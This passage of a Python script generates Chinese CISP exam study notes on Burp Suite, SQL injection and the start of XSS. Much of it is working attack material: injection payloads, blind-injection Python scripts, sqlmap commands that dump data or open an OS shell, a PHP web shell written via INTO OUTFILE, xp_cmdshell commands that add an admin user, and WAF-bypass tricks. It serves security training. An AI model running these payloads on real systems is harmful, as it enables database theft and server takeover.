# 8. SQLiPy - SQL注入辅助
# 9. CO2 - 各种增强功能
# 10. Hackvertor - 高级编码/加密转换

# 安装方式
# Extender → BApp Store → 搜索 → Install
```

### 8.2 Turbo Intruder

```python
# Turbo Intruder Python脚本示例
# 用于高速暴力破解

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    
    # 从字典文件读取
    for word in open('/path/to/passwords.txt'):
        engine.queue(target.req, word.strip())

def handleResponse(req, interesting):
    # 如果响应中包含 "Welcome" 则标记
    if 'Welcome' in req.response:
        table.add(req)
```

### 8.3 Autorize

```bash
# Autorize - 自动化授权测试
# 功能：
# 1. 自动将高权限用户的Cookie替换为低权限用户的Cookie
# 2. 比较响应差异
# 3. 检测未授权访问漏洞（IDOR）

# 配置：
# 1. 设置高权限Cookie（如管理员）
# 2. 设置低权限Cookie（如普通用户）
# 3. 在正常浏览中自动检测
# 4. 红色标记 = 可能存在未授权访问
```

---

## 九、Burp Suite高级配置

### 9.1 Session Handling

```bash
# Session Handling Rules
# 处理复杂的认证和会话管理

# 常见场景：
# 1. 自动登录（登录失败时自动重新登录）
# 2. CSRF Token自动获取
# 3. Session Cookie自动更新
# 4. 多步骤认证流程

# 配置位置：
# Project Options → Sessions → Session Handling Rules
```

### 9.2 上游代理配置

```bash
# 上游代理配置
# User Options → Connections → Upstream Proxy Servers

# 使用场景：
# 1. 通过公司代理访问外网
# 2. 通过SOCKS代理访问暗网
# 3. 通过VPN访问内网
# 4. 多级代理链

# 配置示例：
# Destination host: *.target.com
# Proxy host: 127.0.0.1
# Proxy port: 1080
# Authentication: None/Basic/NTLM
```

### 9.3 性能优化

```bash
# 性能优化设置
# User Options → Connections
# - 连接超时
# - 最大并发连接数
# - 请求限制

# Dashboard → Settings
# - Java内存分配
# - 日志级别

# 启动参数优化
java -Xmx4g -jar burpsuite_pro.jar
# -Xmx4g: 分配4GB内存
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | Burp默认端口 | ★★★★ | ★ | 127.0.0.1:8080 |
| 2 | Repeater功能 | ★★★★ | ★ | 手动修改重放HTTP请求 |
| 3 | Intruder攻击模式 | ★★★★★ | ★★ | Sniper/Battering Ram/Pitchfork/Cluster Bomb |
| 4 | Scanner类型 | ★★★★ | ★★ | 主动扫描(Active)和被动扫描(Passive) |
| 5 | Payload处理 | ★★★ | ★★ | 前缀/后缀/编码/哈希/查找替换 |
| 6 | Spider功能 | ★★★ | ★ | 自动爬取Web应用内容 |
| 7 | Decoder功能 | ★★★ | ★ | URL/HTML/Base64/Hex编解码 |
| 8 | BApp Store | ★★★ | ★★ | 400+扩展，社区贡献 |
| 9 | 代理配置 | ★★★★ | ★ | 浏览器配置代理+安装CA证书 |
| 10 | Session Handling | ★★★ | ★★★ | 自动处理登录/CSRF Token/Session |

### 💡 知识巧记口诀

> **"Burp五大金刚"** — Proxy拦截、Repeater重放、Intruder攻击、Scanner扫描、Spider爬虫。记住：**"拦重攻扫爬"**。

> **"Intruder四模式"** — Sniper（单打）、Battering Ram（齐攻）、Pitchfork（配对）、Cluster Bomb（全组合）。记住：**"狙击手单打，攻城锤齐攻，干草叉配对，集束炸弹全覆盖"**。

> **"Payload处理链"** — 前缀→后缀→编码→哈希。记住：**"前后编哈"**——添加前缀、添加后缀、编码转换、哈希计算。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "Burp Community版功能完整" | ❌ 错误！缺少Scanner、定时任务等功能 |
| "Intruder不会影响目标" | ❌ 错误！Intruder发送大量请求，可能影响目标 |
| "Scanner只检测Web漏洞" | ❌ 不准确！Scanner还能检测配置错误、信息泄露 |
| "代理配置后就能拦截HTTPS" | ❌ 错误！需要额外安装Burp CA证书 |
| "Repeater只能重放不能修改" | ❌ 错误！Repeater可以任意修改请求 |

---

## 学习建议

1. 🔧 **配置好代理环境**：在浏览器中正确配置代理并安装CA证书
2. 📚 **通读OWASP Testing Guide**：了解Burp在每个测试环节的用法
3. 🧪 **动手练习Intruder**：在DVWA等靶场上练习各种攻击模式
4. 🔌 **安装必备扩展**：Turbo Intruder、Autorize、Logger++是必装
5. 📝 **善用项目文件**：保存Burp项目文件，便于后续分析和报告

---

> **Burp Suite不是工具，是武器——学会用它，你就拥有了剖析Web应用的"手术刀"。每一个HTTP请求都是一次攻击机会，Burp帮你抓住每一个机会。**
""")

print("\nDays 1-8 done, continuing with days 9-15...")

# ===================================================================
# Day 9：SQL注入深度利用
# ===================================================================
gen('day-9.md', """# Day 9：SQL注入深度利用

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：50 分钟
>
> SQL注入（SQL Injection）是Web安全领域最经典、最危险、最常见的漏洞之一。自1998年首次被公开讨论以来，它已经"称霸"OWASP Top 10长达20余年。一条精心构造的SQL注入语句，可以直接绕过认证、窃取数据库、甚至获得服务器控制权。本章将带你从基础注入到高级利用，全面掌握SQL注入的攻防技术。

---

## 导航目录

- [一、SQL注入原理与分类](#一sql注入原理与分类)
- [二、SQL注入手工检测技术](#二sql注入手工检测技术)
- [三、Union联合查询注入](#三union联合查询注入)
- [四、布尔盲注技术](#四布尔盲注技术)
- [五、时间盲注技术](#五时间盲注技术)
- [六、报错注入技术](#六报错注入技术)
- [七、sqlmap自动化注入](#七sqlmap自动化注入)
- [八、SQL注入高级利用](#八sql注入高级利用)
- [九、WAF绕过技术](#九waf绕过技术)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、SQL注入原理与分类

### 1.1 SQL注入原理

SQL注入的本质是**将用户输入的数据当作SQL代码执行**。当应用程序使用字符串拼接构建SQL查询，且未对用户输入进行充分过滤时，攻击者可以注入恶意的SQL语句：

```sql
-- 正常的SQL查询
SELECT * FROM users WHERE username = 'admin' AND password = '123456';

-- 如果password参数可控，注入：
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
--                                                              ^^^^^^^^^^
--                                                              注入部分
-- 条件 '1'='1' 始终为真，绕过密码验证
```

### 1.2 SQL注入分类

| 分类维度 | 类型 | 描述 |
|:---|:---|:---|
| 注入位置 | GET型 | 参数在URL中 |
| 注入位置 | POST型 | 参数在请求体中 |
| 注入位置 | Cookie型 | 参数在Cookie中 |
| 注入位置 | Header型 | User-Agent/Referer等 |
| 利用方式 | Union注入 | 使用UNION联合查询 |
| 利用方式 | 布尔盲注 | 根据页面差异判断 |
| 利用方式 | 时间盲注 | 根据响应时间判断 |
| 利用方式 | 报错注入 | 利用数据库报错信息 |
| 利用方式 | 堆叠注入 | 执行多条SQL语句 |
| 利用方式 | 二次注入 | 先存储后触发 |
| 数据库类型 | MySQL注入 | MySQL特有语法 |
| 数据库类型 | MSSQL注入 | SQL Server特有语法 |
| 数据库类型 | Oracle注入 | Oracle特有语法 |

> **🔑 高分考点**：SQL注入的三大要素——**注入点**（可控制输入的位置）、**闭合方式**（如何截断原有SQL）、**回显方式**（如何获取查询结果）。

---

## 二、SQL注入手工检测技术

### 2.1 寻找注入点

```bash
# 常见注入点位置
# 1. URL参数
http://target.com/page.php?id=1
http://target.com/product.php?cat=electronics

# 2. POST参数
username=admin&password=123456

# 3. HTTP Headers
Cookie: session=abc123
User-Agent: Mozilla/5.0
X-Forwarded-For: 127.0.0.1

# 4. JSON/XML数据
{{"username":"admin","password":"123456"}}

# 注入检测方法
# 方法1：单引号测试
http://target.com/page.php?id=1'
# 观察是否出现SQL错误信息

# 方法2：逻辑测试
http://target.com/page.php?id=1 AND 1=1    # 正常
http://target.com/page.php?id=1 AND 1=2    # 异常
# 如果两个请求返回不同，可能存在注入

# 方法3：算术测试
http://target.com/page.php?id=2-1          # 等价于id=1
http://target.com/page.php?id=1+0          # 等价于id=1

# 方法4：注释符测试
http://target.com/page.php?id=1'-- -
http://target.com/page.php?id=1'#
http://target.com/page.php?id=1';%00
```

### 2.2 确定闭合方式

```bash
# 常见闭合场景
# 场景1：数字型（无需闭合）
SELECT * FROM products WHERE id = $id
# Payload: 1 UNION SELECT 1,2,3

# 场景2：单引号字符串
SELECT * FROM users WHERE username = '$username'
# Payload: ' UNION SELECT 1,2,3-- -

# 场景3：双引号字符串
SELECT * FROM users WHERE username = "$username"
# Payload: " UNION SELECT 1,2,3-- -

# 场景4：带括号
SELECT * FROM users WHERE (id = '$id')
# Payload: ') UNION SELECT 1,2,3-- -

# 场景5：多括号嵌套
SELECT * FROM users WHERE ((id = '$id'))
# Payload: ')) UNION SELECT 1,2,3-- -

# 自动化闭合测试
# Payload序列：
1'
1"
1')
1")
1'))
1"))
```

### 2.3 确定列数

```bash
# ORDER BY 方法
http://target.com/page.php?id=1 ORDER BY 1  # 正常
http://target.com/page.php?id=1 ORDER BY 2  # 正常
http://target.com/page.php?id=1 ORDER BY 3  # 正常
http://target.com/page.php?id=1 ORDER BY 4  # 错误！
# 结论：3列

# UNION SELECT 方法
http://target.com/page.php?id=1 UNION SELECT NULL-- -
http://target.com/page.php?id=1 UNION SELECT NULL,NULL-- -
http://target.com/page.php?id=1 UNION SELECT NULL,NULL,NULL-- -
# 直到不报错，NULL的数量就是列数
```

---

## 三、Union联合查询注入

### 3.1 Union注入基础

```sql
-- 确定回显列
-- 假设有3列，找出哪些列会显示在页面上
?id=-1 UNION SELECT 1,2,3-- -
-- 如果页面上显示 2 和 3，则第2和第3列有回显

-- 获取数据库版本
?id=-1 UNION SELECT 1,@@version,3-- -              # MySQL
?id=-1 UNION SELECT 1,version(),3-- -               # PostgreSQL
?id=-1 UNION SELECT 1,(SELECT @@version),3-- -     # MSSQL

-- 获取当前数据库名
?id=-1 UNION SELECT 1,database(),3-- -              # MySQL

-- 获取当前用户
?id=-1 UNION SELECT 1,user(),3-- -                  # MySQL
?id=-1 UNION SELECT 1,current_user,3-- -            # PostgreSQL
?id=-1 UNION SELECT 1,system_user,3-- -             # MSSQL
```

### 3.2 枚举数据库结构

```sql
-- MySQL 枚举所有数据库
?id=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -

-- MySQL 枚举数据库中的所有表
?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='database_name'-- -

-- MySQL 枚举表中的所有列
?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- MySQL 获取数据
?id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users-- -

-- MSSQL 枚举表
?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM INFORMATION_SCHEMA.TABLES-- -

-- Oracle 枚举表
?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM ALL_TABLES-- -
```

### 3.3 跨库查询

```sql
-- MySQL跨库查询
SELECT * FROM database1.table1;
SELECT * FROM database2.table2 UNION SELECT * FROM database1.table1;

-- MSSQL跨库
SELECT * FROM master..sysdatabases;
SELECT * FROM other_db.dbo.users;
```

---

## 四、布尔盲注技术

### 4.1 布尔盲注原理

当页面没有直接回显查询结果，但会根据查询结果是否为空显示不同内容时，可以使用布尔盲注：

```bash
# 布尔盲注基本模式
# 真条件：页面正常显示
# 假条件：页面显示异常（空白/错误信息）

# 示例注入点
http://target.com/page.php?id=1

# 检测
http://target.com/page.php?id=1 AND 1=1    # 页面正常 → 存在注入
http://target.com/page.php?id=1 AND 1=2    # 页面异常 → 确认盲注

# 猜解数据库名长度
http://target.com/page.php?id=1 AND LENGTH(database())=1  # 假
http://target.com/page.php?id=1 AND LENGTH(database())=2  # 假
...
http://target.com/page.php?id=1 AND LENGTH(database())=5  # 真！
# 结论：数据库名长度为5

# 猜解数据库名每个字符
http://target.com/page.php?id=1 AND SUBSTRING(database(),1,1)='a'  # 假
http://target.com/page.php?id=1 AND SUBSTRING(database(),1,1)='b'  # 假
...
http://target.com/page.php?id=1 AND ASCII(SUBSTRING(database(),1,1))=100  # 真！
# 结论：第一个字符ASCII码为100，即 'd'
```

### 4.2 布尔盲注函数速查

```sql
-- MySQL布尔盲注函数
SUBSTRING(string, start, length)      -- 提取子串
ASCII(char)                            -- 获取字符ASCII码
LENGTH(string)                         -- 获取字符串长度
ORD(string)                            -- 获取首字符ASCII码
MID(string, start, length)            -- 同SUBSTRING
LEFT(string, length)                   -- 左侧字符
RIGHT(string, length)                  -- 右侧字符
IF(condition, true_val, false_val)    -- 条件判断

-- 猜解表名
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'u%')>0
-- 如果为真，说明存在以 'u' 开头的表
```

### 4.3 Python布尔盲注脚本

```python
#!/usr/bin/env python3
# 布尔盲注自动化脚本
import requests
import string

url = "http://target.com/page.php"
charset = string.ascii_lowercase + string.digits + "_"

def check_condition(payload):
    # 测试布尔条件
    params = {{"id": f"1 AND ({payload})"}}
    r = requests.get(url, params=params)
    # 根据页面特征判断真/假
    return "Welcome" in r.text  # 调整匹配条件

def get_length(query):
    # 获取查询结果长度
    for i in range(1, 50):
        if check_condition(f"LENGTH(({query}))={i}"):
            return i
    return 0

def get_string(query, length):
    # 逐字符获取查询结果
    result = ""
    for pos in range(1, length + 1):
        for char in charset:
            if check_condition(f"SUBSTRING(({query}),{pos},1)='{char}'"):
                result += char
                print(f"[+] Position {pos}: {char} (Current: {result})")
                break
    return result

# 获取当前数据库名
db_len = get_length("database()")
print(f"[*] Database name length: {db_len}")
db_name = get_string("database()", db_len)
print(f"[+] Database: {db_name}")

# 获取表名
tables_query = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
tables_len = get_length(tables_query)
tables = get_string(tables_query, tables_len)
print(f"[+] Tables: {tables}")
```

---

## 五、时间盲注技术

### 5.1 时间盲注原理

当页面在任何情况下都返回相同内容（无回显、无布尔差异）时，使用时间盲注：

```sql
-- MySQL时间盲注
-- IF(condition, SLEEP(5), 0) -- 如果条件为真，延迟5秒
-- 观察：如果响应时间>=5秒，说明条件为真

-- 检测注入
?id=1 AND SLEEP(5)-- -
# 如果延迟5秒，说明存在注入

-- 猜解数据库名长度
?id=1 AND IF(LENGTH(database())=5, SLEEP(5), 0)-- -
# 如果延迟5秒，说明长度为5

-- 猜解字符
?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))=100, SLEEP(5), 0)-- -
# 如果延迟5秒，说明第一个字符ASCII码为100

-- MSSQL时间盲注
?id=1; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL时间盲注
?id=1; SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- Oracle时间盲注
?id=1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual) IS NULL-- -
```

### 5.2 时间盲注优化

```bash
# 二分法加速（代替逐字符遍历）
# 传统方式：逐字符遍历 ASCII 32-126（约94次/字符）
# 二分法：约7次/字符

# Python二分法时间盲注
import requests
import time

def time_based_check(payload):
    # 检测时间盲注条件
    start = time.time()
    r = requests.get(url, params={{"id": payload}})
    elapsed = time.time() - start
    return elapsed >= 5  # 延迟阈值

def binary_search_char(query, pos):
    # 二分法猜解单个字符
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"1 AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid}, SLEEP(5), 0)-- -"
        if time_based_check(payload):
            low = mid + 1
        else:
            payload = f"1 AND IF(ASCII(SUBSTRING(({query}),{pos},1))={mid}, SLEEP(5), 0)-- -"
            if time_based_check(payload):
                return chr(mid)
            high = mid - 1
    return None
```

---

## 六、报错注入技术

### 6.1 报错注入原理

当数据库错误信息直接显示在页面上时，可以利用报错函数提取数据：

```sql
-- MySQL报错注入函数

-- 1. ExtractValue (5.1+)
?id=1 AND ExtractValue(1, CONCAT(0x7e, (SELECT database()), 0x7e))-- -
-- 报错：XPATH syntax error: '~database_name~'

-- 2. UpdateXML (5.1+)
?id=1 AND UpdateXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)-- -
-- 报错：XPATH syntax error: '~user@host~'

-- 3. FLOOR + RAND + GROUP BY (所有版本)
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -

-- 4. EXP溢出
?id=1 AND EXP(~(SELECT * FROM (SELECT database()) a))-- -

-- 5. BIGINT溢出
?id=1 AND (SELECT !(SELECT * FROM (SELECT database()) x) - ~0)-- -

-- MSSQL报错注入
?id=1 AND 1=CONVERT(int, (SELECT @@version))-- -
-- 错误：将nvarchar值转换为int时失败

-- PostgreSQL报错注入
?id=1 AND 1=CAST((SELECT current_database()) AS int)-- -
```

### 6.2 报错注入数据提取

```sql
-- 提取数据库名
?id=1 AND ExtractValue(1, CONCAT(0x7e, database(), 0x7e))-- -

-- 提取表名（逐条提取，因为报错信息有长度限制）
?id=1 AND ExtractValue(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e))-- -
?id=1 AND ExtractValue(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 0x7e))-- -

-- 提取列名
?id=1 AND ExtractValue(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 0x7e))-- -

-- 提取数据
?id=1 AND ExtractValue(1, CONCAT(0x7e, (SELECT CONCAT(username,':',password) FROM users LIMIT 0,1), 0x7e))-- -
-- 如果数据过长，使用SUBSTRING分段提取
?id=1 AND ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(username) FROM users),1,30), 0x7e))-- -
```

---

## 七、sqlmap自动化注入

### 7.1 sqlmap基础用法

```bash
# 基础扫描
sqlmap -u "http://target.com/page.php?id=1"

# 指定参数
sqlmap -u "http://target.com/page.php?id=1" -p id

# POST请求
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" -p password

# 带Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# 指定数据库类型
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
sqlmap -u "http://target.com/page.php?id=1" --dbms=mssql

# 获取数据库信息
sqlmap -u "http://target.com/page.php?id=1" --dbs          # 列出所有数据库
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables    # 列出表
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns  # 列出列
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump  # 导出数据

# 获取数据库用户和权限
sqlmap -u "http://target.com/page.php?id=1" --users
sqlmap -u "http://target.com/page.php?id=1" --privileges
sqlmap -u "http://target.com/page.php?id=1" --is-dba       # 检查是否DBA

# 读取/写入文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 7.2 sqlmap高级选项

```bash
# OS Shell获取
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL Shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# 使用代理
sqlmap -u "http://target.com/page.php?id=1" --proxy=http://127.0.0.1:8080

# 使用TOR匿名
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor

# 指定技术
sqlmap -u "http://target.com/page.php?id=1" --technique=U     # 仅Union
sqlmap -u "http://target.com/page.php?id=1" --technique=B     # 仅Boolean盲注
sqlmap -u "http://target.com/page.php?id=1" --technique=T     # 仅Time盲注
sqlmap -u "http://target.com/page.php?id=1" --technique=E     # 仅Error报错
sqlmap -u "http://target.com/page.php?id=1" --technique=S     # 仅Stack堆叠
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST # 全部

# 风险等级和检测级别
sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2
# level 1-5: 检测深度
# risk 1-3: 风险等级（3可能更新数据）

# 自定义注入位置
sqlmap -u "http://target.com/page.php?id=1" --prefix="')" --suffix=" AND ('1'='1"

# 批量扫描
sqlmap -m urls.txt --batch  # 从文件读取URL，自动回答
sqlmap -l burp.log          # 从Burp日志读取请求

# 优化参数
sqlmap -u "http://target.com/page.php?id=1" --random-agent    # 随机UA
sqlmap -u "http://target.com/page.php?id=1" --delay=1         # 请求延迟
sqlmap -u "http://target.com/page.php?id=1" --timeout=30      # 超时时间
sqlmap -u "http://target.com/page.php?id=1" --retries=3       # 重试次数
sqlmap -u "http://target.com/page.php?id=1" --threads=10      # 线程数
```

---

## 八、SQL注入高级利用

### 8.1 文件读写

```sql
-- MySQL读写文件（需要FILE权限）
-- 读取文件
SELECT LOAD_FILE('/etc/passwd');
?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

-- 写入文件（写入WebShell）
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -

-- 使用DUMPFILE（不换行）
?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'-- -

-- 前提条件检查
-- 1. secure_file_priv 设置
SHOW VARIABLES LIKE 'secure_file_priv';
-- 为空：可以读写任意位置
-- 有路径：只能在该路径下读写
-- 为NULL：禁止读写

-- 2. 用户必须有FILE权限
-- 3. 目录必须有写入权限
```

### 8.2 命令执行

```sql
-- MySQL UDF提权
-- 条件：MySQL以root运行，plugin目录可写

-- Step 1: 检查plugin目录
SHOW VARIABLES LIKE 'plugin_dir';

-- Step 2: 上传UDF DLL
-- 使用sqlmap的UDF功能
sqlmap -u "http://target.com/page.php?id=1" --udf-inject

-- Step 3: 创建函数
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.dll';
SELECT sys_exec('whoami');

-- MSSQL xp_cmdshell
-- 启用xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
```

### 8.3 二次注入

```bash
# 二次注入原理
# Step 1: 注册用户时注入恶意数据
# 用户名: admin'-- -
# 存入数据库时：admin'-- -

# Step 2: 后续操作使用该数据
# 修改密码时：
# UPDATE users SET password='newpass' WHERE username='admin'-- -'
# 实际效果：修改了admin的密码而不是注册用户的密码

# 常见二次注入场景
# 1. 用户注册 → 密码重置
# 2. 商品添加 → 商品查看
# 3. 评论发表 → 评论展示
```

---

## 九、WAF绕过技术

### 9.1 关键字绕过

```sql
-- 大小写绕过
SeLeCt * FrOm users
UnIoN SeLeCt 1,2,3

-- 双写绕过
SELSELECTECT
UNION SELECT → UNIUNIONON SELSELECTECT

-- 注释绕过
SELECT/**/password/**/FROM/**/users
UNI/**/ON SEL/**/ECT 1,2,3

-- 内联注释
/*!SELECT*/ password FROM users
/*!50000SELECT*/ password FROM users  -- 版本号判断

-- 等价替换
AND → &&
OR → ||
= → LIKE, REGEXP, BETWEEN, <, >
空格 → /**/, %09, %0a, %0b, %0c, %0d, %a0, +
SUBSTRING → SUBSTR, MID, LEFT, RIGHT
SLEEP → BENCHMARK(5000000, MD5('a'))
```

### 9.2 编码绕过

```sql
-- URL编码
SELECT → %53%45%4c%45%43%54
' → %27
空格 → %20, +

-- 双重URL编码
' → %25%32%37

-- Hex编码
SELECT password FROM users WHERE username = 0x61646d696e
-- 0x61646d696e = 'admin'

-- Unicode编码
' → %u0027

-- Base64编码（某些应用自动解码）
-- 需要根据具体WAF规则调整

-- 字符集编码
-- 使用宽字节注入（GBK编码）
?id=1%df' UNION SELECT 1,2,3-- -
-- %df' 在GBK中构成一个汉字，吃掉了转义符
```

### 9.3 HTTP参数污染

```bash
# 参数拆分
# 原始：?id=1 UNION SELECT 1,2,3
# 拆分：?id=1/*&id=*/UNION/*&id=*/SELECT 1,2,3

# HPP (HTTP Parameter Pollution)
?id=1&id=2 UNION SELECT 1,2,3
# 不同平台处理方式不同
# PHP/Apache: 取最后一个
# ASP.NET/IIS: 取第一个，逗号拼接
# JSP/Tomcat: 取第一个
# Python: 返回列表

# 参数污染绕过
# WAF检测第一个参数，应用使用最后一个参数
?id=1&id=2 UNION SELECT 1,2,3
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | SQL注入定义 | ★★★★★ | ★ | 用户输入作为SQL代码执行 |
| 2 | 注入类型分类 | ★★★★★ | ★★ | Union/Boolean/Time/Error/Stack/二次 |
| 3 | Union注入关键步骤 | ★★★★★ | ★★ | ORDER BY确定列数→找回显位→获取数据 |
| 4 | 布尔盲注原理 | ★★★★ | ★★★ | 根据页面差异逐位推断 |
| 5 | 时间盲注函数 | ★★★★ | ★★ | SLEEP(MySQL)/WAITFOR DELAY(MSSQL)/pg_sleep(PostgreSQL) |
| 6 | sqlmap常用参数 | ★★★★★ | ★★ | -u URL, --dbs, -D DB --tables, --dump |
| 7 | WAF绕过技术 | ★★★★ | ★★★ | 大小写/双写/注释/编码/等价替换 |
| 8 | 文件读写条件 | ★★★★ | ★★★ | FILE权限 + secure_file_priv配置 |
| 9 | xp_cmdshell | ★★★ | ★★★ | MSSQL命令执行存储过程 |
| 10 | information_schema | ★★★★ | ★★ | MySQL元数据库，存储数据库结构信息 |

### 💡 知识巧记口诀

> **"注入五步走"** — 找注入点（单引号）、判闭合方式（数字/字符串）、定列数（ORDER BY）、找回显位（UNION SELECT）、取数据。记住：**"找判定回取"**。

> **"盲注三兄弟"** — 布尔盲注（看差异）、时间盲注（看延迟）、报错注入（看错误）。记住：**"布尔看差异，时间看延迟，报错看信息"**。

> **"WAF绕过五法"** — 大小写混用、双写关键字、注释分割、编码混淆、等价替换。记住：**"大双注编等"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "参数化查询100%防SQL注入" | ❌ 不绝对！存储过程中拼接字符串仍可能注入 |
| "WAF能完全防护SQL注入" | ❌ 错误！WAF可被绕过 |
| "ORDER BY确定列数只能在有回显时使用" | ❌ 错误！ORDER BY报错也能确定列数 |
| "时间盲注比布尔盲注慢" | ✅ 正确！时间盲注每个字符需要固定延迟 |
| "sqlmap不会被WAF检测" | ❌ 错误！sqlmap默认特征明显，需要配合--tamper |

---

## 学习建议

1. 🧪 **搭建SQL注入靶场**：安装SQLi-Labs、DVWA，系统练习各种注入技术
2. 📝 **手工注入优先**：先用sqlmap发现问题，再手工复现，理解原理
3. 🔬 **学习sqlmap tamper脚本**：阅读tamper目录下的绕过脚本，理解WAF绕过原理
4. 🛡️ **同时学习防御**：理解参数化查询、输入过滤、最小权限原则
5. 📊 **建立注入检查清单**：按检测流程建立SOP，确保不遗漏

---

> **SQL注入是"最老也最年轻"的漏洞——老在原理简单，年轻在总有人中招。一个单引号可能就是一个系统的入口，SQL注入的"优雅"在于：不需要任何高级技术，只需要对数据库的深刻理解。**
""")

# ===================================================================
# Day 10：XSS深度利用
# ===================================================================
gen('day-10.md', """# Day 10：XSS深度利用

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> 跨站脚本攻击（XSS，Cross-Site Scripting）是Web应用最常见的漏洞之一，常年位居OWASP Top 10前列。XSS的本质是攻击者将恶意脚本注入到受害者浏览器中执行，从而窃取Cookie、劫持会话、钓鱼欺骗、甚至控制浏览器。本章将带你从XSS的基础分类到高级利用，全面掌握这一经典攻击技术。

---

## 导航目录

- [一、XSS原理与分类](#一xss原理与分类)
- [二、反射型XSS深度利用](#二反射型xss深度利用)
- [三、存储型XSS深度利用](#三存储型xss深度利用)
- [四、DOM型XSS深度利用](#四dom型xss深度利用)
- [五、XSS高级Payload构造](#五xss高级payload构造)
- [六、XSS会话劫持实战](#六xss会话劫持实战)
- [七、XSS钓鱼与键盘记录](#七xss钓鱼与键盘记录)
- [八、XSS绕过技术](#八xss绕过技术)
- [九、XSS自动化工具](#九xss自动化工具)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、XSS原理与分类

### 1.1 XSS攻击原理

XSS攻击的核心是**攻击者向Web页面注入恶意脚本，当其他用户访问该页面时，恶意脚本在其浏览器中执行**：

```
XSS攻击流程：
攻击者                    Web服务器                 受害者
  │                         │                       │
  │  1. 注入恶意脚本        │                       │
  │────────────────────────►│                       │
  │                         │  2. 存储/反射脚本      │
  │                         │                       │
  │  3. 构造恶意链接        │                       │
  │────────────────────────────────────────────────►│
  │                         │                       │
  │                         │  4. 受害者访问页面     │
  │                         │◄──────────────────────│
  │                         │  5. 返回含恶意脚本页面 │
  │                         │──────────────────────►│
  │                         │                       │
  │  6. 恶意脚本执行，窃取Cookie/数据                │
  │◄────────────────────────────────────────────────│
```

### 1.2 XSS三大类型对比

| 类型 | 触发方式 | 持久性 | 危害范围 | 典型场景 |
|:---|:---|:---|:---|:---|
| 反射型XSS | 用户点击恶意链接 | 非持久 | 单个用户 | 搜索框、错误页面 |
| 存储型XSS | 访问含恶意数据的页面 | 持久 | 所有访问者 | 评论区、用户资料 |
| DOM型XSS | 客户端JS处理不当 | 非持久 | 单个用户 | URL Hash、localStorage |

